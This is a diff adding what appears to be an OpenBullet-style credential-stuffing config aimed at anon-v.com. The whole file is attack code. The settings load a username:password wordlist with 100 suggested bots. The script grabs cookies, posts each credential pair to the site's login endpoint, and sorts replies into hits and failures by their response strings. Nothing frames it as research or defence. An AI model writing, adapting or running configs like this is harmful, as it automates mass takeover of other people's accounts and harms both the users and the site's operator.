@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "Anon-V",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-28T02:17:17.2007096+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Getting_Cookies REQUEST GET "http://anon-v.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Checking REQUEST POST "http://anon-v.com/login/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&pass=<PASS>&action=login&email_link=http%3A%2F%2Fanon-v.com%2Femail%2F&format=json&mode=async" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Username or Password" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success" 
